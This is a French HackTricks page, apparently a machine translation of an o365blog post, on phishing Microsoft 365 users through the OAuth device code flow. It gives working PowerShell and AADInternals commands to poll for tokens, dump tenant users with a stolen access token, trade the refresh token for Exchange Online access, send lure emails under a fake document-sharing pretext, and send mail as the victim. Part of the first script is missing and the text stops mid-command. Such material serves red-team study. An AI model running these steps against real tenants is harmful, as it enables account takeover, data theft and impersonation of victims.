# Az - Hame√ßonnage d'authentification de code de p√©riph√©rique

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFT exclusifs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ [**le groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **d√©p√¥ts Github.**

</details>

**Ce post a √©t√© copi√© depuis** [**https://o365blog.com/post/phishing/**](https://o365blog.com/post/phishing/)

### Qu'est-ce que l'authentification de code de p√©riph√©rique <a href="#what-is-device-code-authentication" id="what-is-device-code-authentication"></a>

Selon la [documentation](https://docs.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-device-code) de Microsoft, l'authentification de code de p√©riph√©rique :

> permet aux utilisateurs de se connecter √† des appareils √† contraintes d'entr√©e tels qu'une t√©l√©vision intelligente, un appareil IoT ou une imprimante. Pour activer ce flux, l'appareil invite l'utilisateur √† visiter une page Web dans son navigateur sur un autre appareil pour se connecter. Une fois que l'utilisateur est connect√©, l'appareil peut obtenir des jetons d'acc√®s et des jetons de rafra√Æchissement au besoin.

Le processus est le suivant :

1. Un utilisateur lance une application prenant en charge le flux de code de p√©riph√©rique sur un appareil
2. L'application se connecte √† Azure AD / endpoint devicecode et envoie **client\_id** et **resource**
3. Azure AD renvoie **device\_code**, **user\_code** et **verification\_url**
4. L'appareil affiche l'URL de v√©rification (hxxps://microsoft.com/devicelogin) et le **user\_code** √† l'utilisateur
5. L'utilisateur ouvre un navigateur et navigue vers **verification\_url**, donne le **user\_code** lorsqu'on lui demande et se connecte
6. L'appareil interroge Azure AD jusqu'√† ce qu'il obtienne **access\_token** et **refresh\_token** apr√®s une connexion r√©ussie

![Flux de code de p√©riph√©rique](https://o365blog.com/images/posts/phishing\_5.png)

### Hame√ßonnage avec l'authentification de code de p√©riph√©rique <a href="#phishing-with-device-code-authentication" id="phishing-with-device-code-authentication"></a>

L'id√©e de base pour utiliser l'authentification de code de p√©riph√©rique pour le phishing est la suivante.

1. Un attaquant se connecte √† l'endpoint /devicecode et envoie **client\_id** et **resource**
2. Apr√®s avoir re√ßu **verification\_uri** et **user\_code**, cr√©ez un e-mail contenant un lien vers **verification\_uri** et **user\_code**, et envoyez-le √† la victime.
3. La victime clique sur le lien, fournit le code et termine la connexion.
4. L'attaquant re√ßoit **access\_token** et **refresh\_token** et peut maintenant imiter la victime.

#### 1. Connexion √† l'endpoint /devicecode
# Boucle tant que l'autorisation est en attente ou jusqu'√† ce que le d√©lai d'expiration soit d√©pass√©

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Le d√©lai d'expiration est d√©pass√©"
		return
	}
				
	# Essayez d'obtenir la r√©ponse. Donnera 40x pendant la mise en attente, nous devons donc essayer et attraper

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# Ceci est un flux normal, retourne toujours 40x sauf en cas de succ√®s

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# Pas en attente donc c'est une vraie erreur

			Write-Error $details.error_description
			return
		}
	}

	# Si nous avons obtenu une r√©ponse, tout va bien !

	if($response)
	{
		break # Sortir de la boucle

	}
}
```

Maintenant, nous pouvons utiliser le jeton d'acc√®s pour usurper la victime :

```powershell
# Exporter les utilisateurs du locataire au format csv

Get-AADIntUsers -AccessToken $response.access_token | Export-Csv users.csv
```

Nous pouvons √©galement obtenir des jetons d'acc√®s pour d'autres services en utilisant le jeton de rafra√Æchissement tant que le client\_id reste le m√™me.

Le script suivant obtient un jeton d'acc√®s pour Exchange Online.

```powershell
# Cr√©er le corps pour obtenir un jeton d'acc√®s pour Exchange Online

$body=@{
	"client_id" =     "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" =    "refresh_token"
	"scope" =         "openid"
	"resource" =      "https://outlook.office365.com"
	"refresh_token" = $response.refresh_token
}

$EXOresponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token" -Body $body -ErrorAction SilentlyContinue

# Envoyer un e-mail en tant que victime

Send-AADIntOutlookMessage -AccessToken $EXOresponse.access_token -Recipient "another.wictim@target.org" -Subject "Paiement en retard" -Message "Payez ceci <h2>au plus vite !</h2>"
```

## Utilisation de AADInternals pour le phishing <a href="#using-aadinternals-for-phishing" id="using-aadinternals-for-phishing"></a>

AADInternals (v0.4.4 ou ult√©rieure) dispose d'une fonction [Invoke-AADIntPhishing](https://o365blog.com/aadinternals/#invoke-aadintphishing) qui automatise le processus de phishing.

Le message de phishing peut √™tre personnalis√©, le message par d√©faut est le suivant :

```
'<div>Salut !<br/>Ceci est un message envoy√© par quelqu'un qui utilise la fonction de phishing AADInternals. <br/><br/>Voici un <a href="{1}">lien</a> que vous <b>ne devez pas cliquer</b>.<br/><br/>Si vous d√©cidez quand m√™me de le faire, fournissez le code suivant lorsqu'on vous le demande : <b>{0}</b>.</div>'
```

Message par d√©faut dans l'e-mail :\
![Phishing email](https://o365blog.com/images/posts/phishing\_11.png)

Message par d√©faut dans Teams :\
![Phishing message](https://o365blog.com/images/posts/phishing\_12.png)

### E-mail <a href="#email" id="email"></a>

L'exemple suivant envoie un e-mail de phishing en utilisant un message personnalis√©. Les jetons sont enregistr√©s dans le cache.

```powershell
# Cr√©er un message personnalis√©

$message = '<html>Salut !<br/>Voici le lien vers le <a href="{1}">document</a>. Utilisez le code suivant pour y acc√©der : <b>{0}</b>.</html>'

# Envoyer un e-mail de phishing aux destinataires en utilisant un message personnalis√© et enregistrer les jetons dans le cache

Invoke-AADPhishing -Recipients "wvictim@company.com","wvictim2@company.com" -Subject "Johnny a partag√© un document avec vous" -Sender "Johnny Carson <jc@somewhere.com>" -SMTPServer smtp.myserver.local -Message $message -SaveToCache 
```

```
Code: CKDZ2BURF
Mail envoy√© √† : wvictim@company.com
...
Jetons d'acc√®s re√ßus pour william.victim@company.com
```

Et maintenant, nous pouvons envoyer un e-mail en tant que victime en utilisant le jeton mis en cache.

```powershell
# Envoyer un e-mail en tant que victime

Send-AADIntOutlookMessage -Recipient "another.w